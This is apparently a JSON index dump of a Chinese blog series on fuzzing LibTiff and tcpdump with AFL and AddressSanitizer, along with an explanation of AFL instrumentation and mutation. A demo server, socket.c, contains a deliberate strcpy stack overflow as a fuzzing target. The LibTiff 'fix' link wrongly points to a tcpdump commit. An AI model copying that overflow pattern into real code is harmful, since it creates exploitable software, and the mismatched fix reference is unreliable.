","date":"2020-12-08","objectID":"/fuzzing101-4/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-08","objectID":"/fuzzing101-4/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Workflow 开启 ASan 功能，对 LibTiff 库进行fuzz 分析 crash ，找到对应漏洞的 PoC 测量该 PoC 的代码覆盖率情况 修复漏洞 ","date":"2020-12-08","objectID":"/fuzzing101-4/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待 fuzz 的 LibTiff 环境，进行编译待用： cd $HOME/Desktop/Fuzz/training mkdir fuzzing_tiff \u0026\u0026 cd fuzzing_tiff/ # download and uncompress the target wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz tar -xzvf tiff-4.0.4.tar.gz # make and install libtiff cd tiff-4.0.4/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install # test the target program $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff 以上安装不报错的话，可以正常调用 LibTiff 库 ： 在上面的启动命令中，基本开启了软件的所有参数，这样有利于在进行fuzz时执行更多的代码路径，从而获得更高的代码覆盖率。 2. Seed corpus creation 直接使用 test/images 文件夹下的测试用例作为本次fuzz的语料。 3. Code Coverage 代码覆盖率是一种软件指标，表达了每行代码被触发的次数。通过使用代码覆盖率，我们可以了解 fuzzer 已经到达了代码的哪些部分，并可视化了 fuzzing 过程。 首先，需要安装 lcov： sudo apt install lcov 然后，我们使用 --coverage选项来重建libTIFF库： rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean CFLAGS=\"--coverage\" LDFLAGS=\"--coverage\" ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install 然后使用下面的指令来进行代码覆盖率收集： cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ lcov --zerocounters --directory ./ # 重置计数器 lcov --capture --initial --directory ./ --output-file app.info $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff lcov --no-checksum --directory ./ --capture --output-file app2.info # 返回“基线”覆盖数据文件，其中包含每个检测行的零覆盖 最后，生成HTML输出： genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info 一切顺利的话，会生成以下文件： 打开生成的 index.html 会看到如下结果： 4. Fuzzing 重新编译： rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared # 开启AFL_USE_ASAN AFL_USE_ASAN=1 make -j4 AFL_USE_ASAN=1 make install 执行 afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/ -o $HOME/Desktop/Fuzz/training/fuzzing_tiff/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@ ","date":"2020-12-08","objectID":"/fuzzing101-4/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下： ","date":"2020-12-08","objectID":"/fuzzing101-4/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"4. Triage ASan追踪结果如下： ","date":"2020-12-08","objectID":"/fuzzing101-4/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2020-12-08","objectID":"/fuzzing101-4/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/fuzzing101-4/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 3","date":"2020-12-07","objectID":"/fuzzing101-3/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第三篇，fuzz的对象为 tcpdump。 ","date":"2020-12-07","objectID":"/fuzzing101-3/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics TCPdump CVE-2017-13028 4hous ASAN CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2020-12-07","objectID":"/fuzzing101-3/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Learning Target 什么是 ASAN(Address Sanitizer)，一个运行时内存错误检测工具 如何使用ASAN进行fuzz 使用ASAN对crash进行分类 ","date":"2020-12-07","objectID":"/fuzzing101-3/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-07","objectID":"/fuzzing101-3/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Workflow 确定如何进行TCpdump的fuzz工作 在fuzz时开启ASAN功能 实际的fuzz过程 追踪crash，找到对应的漏洞的poc 修复漏洞 ","date":"2020-12-07","objectID":"/fuzzing101-3/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的 TCPdump 环境，进行编译待用： cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump # download and uncompress tcpdump-4.9.2.tar.gz wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz tar -xzvf tcpdump-4.9.2.tar.gz # download and uncompress libpcap-1.8.1.tar.gz wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.1.tar.gz tar -xzvf libpcap-1.8.1.tar.gz # build and install cd libpcap-libpcap-1.8.1/ ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # build and install tcpdump cd .. cd tcpdump-tcpdump-4.9.2/ CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # test $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -h 以上安装不报错的话，可以正常启动 tcpdump ： 2. Seed corpus creation 在 tests 文件夹中有很多的测试样例： 运行样例的命令如下： $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r [.pcap file] # -vvvv 输出极为详细的信息 # -XX 把协议头和包内容都原原本本的显示出来（tcpdump会以16进制和ASCII的形式显示） # -ee 在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议 # -nn 指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示 # -r 指定文件 运行结果大概如下： 3. AddressSanitizer AddressSanitizer(ASAN) 是一个C和C++的内存错误检测工具，2011年由Google的研究员开发。 它包括一个编译器检测模块和一个运行时库，该工具可以发现对堆、栈和全局对象的越界访问、释放后重利用、双重释放和内存泄漏错误。 AddressSanitizer 是开源的，并且从 3.1 版开始与 LLVM 编译器工具链集成。虽然它最初是作为 LLVM 的项目开发的，但它已被移植到 GCC 并包含在 GCC \u003e= 4.8 的版本中 。 更多内容请参考AddressSanitizer。 本文我们主要是为了在fuzz时开启ASAN，所以先删除上面已经编译好的对象文件和可执行文件： rm -r $HOME/fuzzing_tcpdump/install cd $HOME/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ make clean cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ make clean clean 完成后，在进行make前附加 AFL_USE_ASAN=1 的编译选项： cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install 4. Fuzzing 执行 afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/Desktop/Fuzz/fuzzing_tcpdump/out/ -s 123 -- $HOME/Desktop/Fuzz/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@ 备注：这里指定了 -m none 选项是取消了AFL的内存使用限制，因为在64-bit系统下，ASAN会占用较多的内存。 ","date":"2020-12-07","objectID":"/fuzzing101-3/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下： ","date":"2020-12-07","objectID":"/fuzzing101-3/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"4. Triage 对使用了ASAN 进行build的程序进行debug是一件十分容易的事情，只要直接将crash文件喂给程序运行即可，然后就可以得到crash的相关信息，包括函数的执行追踪： ","date":"2020-12-07","objectID":"/fuzzing101-3/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2020-12-07","objectID":"/fuzzing101-3/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/fuzzing101-3/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 2","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"本文是AFL系列第二篇，主要介绍AFL的一些基本原理。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"一、代码覆盖率 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. 计算方法 代码覆盖率的计量单位，通常有3种： 函数（Fuction-Level） 基本块（BasicBlock-Level） 边界（Edge-Level） （1）函数（Fuction-Level） 这个很容易理解，就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。 所以，通常的统计方式是用基本块，简称BB。 （2）基本块（BasicBlock-Level） 基本块，直接看下图就很容易理解了。 IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。 （3）边界（Edge-Level） edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。比如示例代码： 在IDA中可以看到A、B、C这3个基本块，但当a为假时，程序就会从A执行到C。 前面基本块的方式就无法确切地知道是否曾从A执行到C，尤其是该段代码被多次执行的情况，就更无法知道，这时edge覆盖方式就出现了。 edge会在A跟C之间建立虚拟块D，通过判断D是否执行过，来确认是否曾从A执行到C，这种方式也会比较消耗性能。 以上内容摘自泉哥博客，原文链接https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFL采用的是第三种方式。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. AFL中两种代码覆盖率计算方式 AFL支持两种代码覆盖率计算方式，有源码的情况下，在源代码编译时进行插桩，无源码的情况下，使用QEMU进行二进制插桩。下一章节会分别详细讲解这两种情况使用的插桩技术。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"二、插桩 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. 有源码 我们以如下代码为例进行说明，文件名为 socket.c #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e#include\u003cstring.h\u003e#include\u003cunistd.h\u003e#include\u003csys/socket.h\u003e#include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 可以进行源码插桩的指令有 afl-gcc、afl-g++、afl-clang、afl-clang++ ( afl-clang-fast 和 afl-clang-fast++ 暂不讨论)，通过查看这些文件的具体属性，可以发现后三者都是 afl-gcc 的软链接，其实都是同一个二进制文件： 通过分析 afl-gcc.c 中的代码可以发现， afl-gcc 就是在原有的编译指令上增加一些编译选项然后调用对应的系统调用指令： 为了方便查看每次源码编译时的编译选项，可以对 afl-gcc.c 进行修改，在 main() 函数中调用 execvp() 之前添加如下代码，打印出实际执行的编译指令： //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); 其中数组 cc_params 存放着编译指令和选项，整数 cc_par_cnt 存放数组有效值，修改完成后对AFL重新进行编译即可。 （afl-clang-fast 和 afl-clang-fast++ 对应的源码文件为 llvm_mode/afl-clang-fast.c ，修改方法相同） 使用 afl-gcc 对上面代码进行编译 afl-gcc -o socket_afl socket.c 可以看到实际执行的编译指令为 gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ，其中 -B \u003cdirectory\u003e 选项用于将添加到编译器的搜索路径，-g 选项生成调试信息，-O3 优化生成代码，-funroll-loops 选项展开循环的迭代次数可以在编译时或进入循环时确定，剩余两个为AFL使用的选项。（gcc的选项可以参考此链接 https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.html） 如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-\u003e”汇编代码”-\u003e”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是as。不过，编译完成AFL后，在其目录下也会存在一个as文件，并作为符号链接指向afl-as。所以，如果通过-B选项为gcc设置了搜索路径，那么afl-as便会作为汇编器，执行实际的汇编操作。 所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过 afl-as 完成。 afl-as 下面通过对比 gcc 和 afl-gcc 的编译结果进行大致分析。 将 afl-gcc 中添加的 -B、-D__AFL_COMPILER=1、DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 三个选项去掉，调用 gcc gcc -o socket socket.c -g -O3 -funroll-loops 这样就生成了 socket_afl 和 socket 两个文件。 使用 bindiff 对这两个文件中的 main 函数进行对比 上图中右下角部分看起来结构不一样，不过这里是 bindiff 识别bug，多出了一个代码块并且少了一条线，我们可以分别使用 ida 打开这两个文件，查看 main 函数的结构图 这里对 bindiff 误报结果的详细分析就不多说了，这个不是本次的重点。 可以看到 afl 进行源代码插桩时不会改变代码的逻辑结构，也不会增加或减少代码块。 对比看下每个代码块中代码的区别 可以看出，基本每个代码块都被添加了一段相似的汇编代码 在 ida 中将这部分代码拷贝出来，如下： lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] 对比可以发现，不同的代码块只有 mov rcx, 650Eh 这条汇编代码向 rcx 存放的值不同，这个就是随机生成的标识代码块的id，当运行到这部分汇编时 afl 就知道是哪个代码块被执行了。 上述 ida 中的汇编代码原型可以在 afl-as.h 中找到（以64位代码为例）： 上述代码执行的主要功能包括： 保存 rdx、 rcx 、rax 寄存器 将 rcx 的值设置为 fprintf() 函数将要打印的变量内容 调用 __afl_maybe_log 函数 恢复寄存器 在以上的功能中， __afl_maybe_log 是插桩代码所执行的实际内容，后续将详细展开。 可以在 afl-as.c 中查看到该汇编的调用，通过 fprintf() 函数的调用，将格式化字符串添加到汇编文件的相应位置。 这里分析下 R(MAP_SIZE) ，它就是上面汇编代码中将 rcx 设置的值。根据定义， MAP_SIZE 为64K，而对于 R(x) 函数定义如下： 其中 R(MAP_SIZE) 相当于 random() % (1 \u003c\u003c MAP_SIZE_POW2) ，也就是生成随机数，所以标识代码块的id是随机生成的（两次编译生成的代码段id不同）。 上述过程总结起来就是在处理到某个分支需要插入桩代码时， afl-as 会随机生成一个随机数，作为运行时保存在 rcx 中的值。而这个随机数，便是用于标识这个代码块的id。 （备注：因为代码块ID随机的问题，会导致一定的","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. 无源码 无源码情况下，AFL使用QEMU进行二进制插桩，具体插桩原理待补充。 ","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"三、变异策略 AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下： bitflip，按位翻转，1变为0，0变为1 arithmetic，整数加/减算术运算 interest，把一些特殊内容替换到原文件中 dictionary，把自动生成或用户提供的token替换/插入到原文件中 havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异 splice，中文意思是“拼接”，此阶段会将两个文件拼接起来得到一个新的文件 其中，前四项 bitflip, arithmetic, interest, dictionary 是非 dumb mode（-d）和主 fuzzer（-M）会进行的操作，由于其变异方式没有随机性，所以也称为 deterministic fuzzing ；havoc 和 splice 则存在随机性，是所有状况的 fuzzer（是否 dumb mode、主从 fuzzer）都会执行的变异。 以下将对这些变异类型进行具体介绍。 ###（1） bitflip 拿到一个原始文件，首先进行的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为： bitflip 1/1， 每次翻转1个bit，按照每1个bit的步长从头开始 bitflip 2/1， 每次翻转相邻的2个bit，按照每1个bit的步长从头开始 bitflip 4/1， 每次翻转相邻的4个bit，按照每1个bit的步长从头开始 bitflip 8/8， 每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转 bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转 bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转 在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断，以图尽可能多得获取文件信息。 自动检测token 在进行 bitflip 1/1变异时，对于每个 byte 的最低位( least significant bit )翻转还进行了额外的处理：如果连续多个 bytes 的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的 bytes 判断是一条token。 例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容： ........IHDR........ 当翻转到字符I的最高位时，因为IHDR被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，IHDR标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：IHDR，并将其记录下来为后面的变异提供备选。 AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在config.h中通过宏定义了限制： /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改 MAX_AUTO_EXTRA 为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。 生成effector map 在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。 不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关： /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。 ###（2） arithmetic 在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段： arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异 arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异 arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异 加减变异的上限，在config.h中的宏ARITH_MAX定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。 此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。 ###（3） interest 下一个阶段是interest，具体可分为： interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换 interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换 interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换 而用于替换的”interesting values”，是AFL预设的一些比较特殊的数： static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; 这些数的定义在config.h文件中： /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */\\ -1, /* */\\ 0, /* */\\ 1, /* */\\ 16, /* One-off with common buffer size */\\ 32, /* One-off with common buffer size */\\ 64, /* One-off w","date":"2020-12-04","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"效果分析 参考 https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html 中的测试方法，同样以 djpeg 为目标，最初的样本集只有一个文本 test，采用二进制插桩的方式进行fuzz，1个主节点以及3个从节点同时进行，测试最终是否能fuzz出一个合法的图片文件。 fuzz后的样本集合如下： 使用 afl-showmap 对所有样本进行分析，编写脚本如下： #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done 第一个参数为样本集合目录，第二个参数为输出目录，假设脚本名为 djpeg.sh ，样本目录为 in ，输出目录为 map ./djpeg.sh in map 脚本的执行结果可在 分析/djpeg_sh脚本输出结果.txt 中查看，以下只展示部分： id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] 